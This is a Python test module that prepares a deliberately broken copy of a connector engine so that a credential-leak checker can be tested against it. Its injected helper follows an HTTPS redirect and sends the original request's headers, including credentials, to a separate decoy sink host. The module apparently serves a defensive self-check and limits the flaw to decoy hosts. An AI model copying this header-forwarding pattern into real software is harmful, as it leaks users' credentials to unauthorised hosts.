"""这是 2.3 凭据使用绑定的验证测试：只对本次运行自建的账户、哨兵凭据与断网测试上游，检查真值是否被取出、放错位置或发往未授权的目的地；不使用真实账户或真实凭据。"""
# Deliberately broken, local-decoy-only connector snapshot for CB-10 judge self-check.
# This module never imports/runs engine code. It only transforms an exclusive copy.
import difflib
import os
from pathlib import Path
from build import inventory, snapshot
from common import identity
from safeio import atomic_write, read_owned

NAME = 'redirect-credentials'
ANCHOR = "                resp = conn.getresponse()\n                phase = 'response'\n"
INJECT = "                resp = conn.getresponse()\n                link, resp = _nb_decoy_follow_once(self, req, answer, headers, link, resp)\n                phase = 'response'\n"
HELPER = r'''

# CB-10 SELF-CHECK ONLY. Not a production patch; never classified as formal.
def _nb_decoy_follow_once(exchange, req, answer, headers, link, resp):
    from dataclasses import replace
    from urllib.parse import urlsplit
    source_hosts = (b'nb-decoy-cb-x.test', b'nb-decoy-cb-t.test', b'nb-decoy-cb-k.test')
    if resp.status not in (302, 307, 308):
        return link, resp
    location = urlsplit(resp.getheader('Location', ''))
    if (req.method != b'GET' or req.scheme != b'https' or req.port != 443
            or req.host not in source_hosts or answer.kind != ALLOW
            or not req.path.startswith(b'/nb-decoy-cb/redirect/')
            or location.scheme != 'https' or location.hostname != 'nb-decoy-cb-sink.test'
            or location.port not in (None, 443) or location.username is not None
            or location.password is not None or location.query or location.fragment
            or not location.path.startswith('/nb-decoy-cb/collect/')):
        raise Refused('self-check outside frozen decoy scope')
    target = replace(req, host=b'nb-decoy-cb-sink.test', port=443, path=location.path.encode('ascii'),
                     query=None, is_ip=False)
    exchange._drop(link)
    # v4 (engine-v3 @ a9eff999) Exchange._connect(req, named, account) resolves and judges the addresses itself.
    followed = exchange._connect(target, answer.named, answer.account)
    try:
        conn = followed.conn
        conn.putrequest('GET', request_target(target), skip_host=True, skip_accept_encoding=True)
        conn.putheader('Host', host_header(target))
        # The intentional flaw: the previously placed headers go to the other host,
        # before the existing finally block zeroes their buffers. No secret logging.
        for name, value in headers:
            conn.putheader(name, value)
        conn.endheaders()
        return followed, conn.getresponse()
    except BaseException:
        exchange._drop(followed)
        raise
'''


def transform(data):
    text = data.decode('utf-8')
    if text.count(ANCHOR) != 1 or '_nb_decoy_follow_once' in text:
        raise ValueError('variant anchor drift/already patched')
    changed = text.replace(ANCHOR,INJECT) + HELPER
    compile(changed,'connector/upstream.py','exec')
    return changed.encode('utf-8')


def patch_snapshot(root, expected):
    root = Path(root)
    if (root.name != 'engine' or not root.parent.name.startswith('nb-decoy-')
            or inventory(root) != expected):
        raise ValueError('variant requires an exact owned engine snapshot')
    file = root / 'connector/upstream.py'
    before = read_owned(file)
    after = transform(before)
    file.chmod(0o600)
    atomic_write(file,after,replace=True); file.chmod(0o444)
    changed = inventory(root)
    differences = [name for name in set(expected['files']) | set(changed['files'])
                   if expected['files'].get(name) != changed['files'].get(name)]
    if differences != ['connector/upstream.py']:
        raise ValueError('variant modified more than its declared patch')
    diff = ''.join(difflib.unified_diff(before.decode().splitlines(True),after.decode().splitlines(True),
                                      fromfile='production/connector/upstream.py',tofile='self-check/connector/upstream.py'))
    return {'variant':NAME,'formal':False,'original':expected,'patched':changed,
            'patch_identity':identity(diff.encode()),'patch':diff,
            'restriction':'GET, registered synthetic source, one HTTPS hop to nb-decoy-cb-sink.test only'}


def prepare_variant(source, destination):
    # Exclusive copy; caller owns its location and cleanup. No production rewrite.
    before = snapshot(Path(source),Path(destination))
    receipt = patch_snapshot(Path(destination),before)
    if inventory(Path(source)) != before:
        raise ValueError('original engine changed during variant preparation')
    return receipt
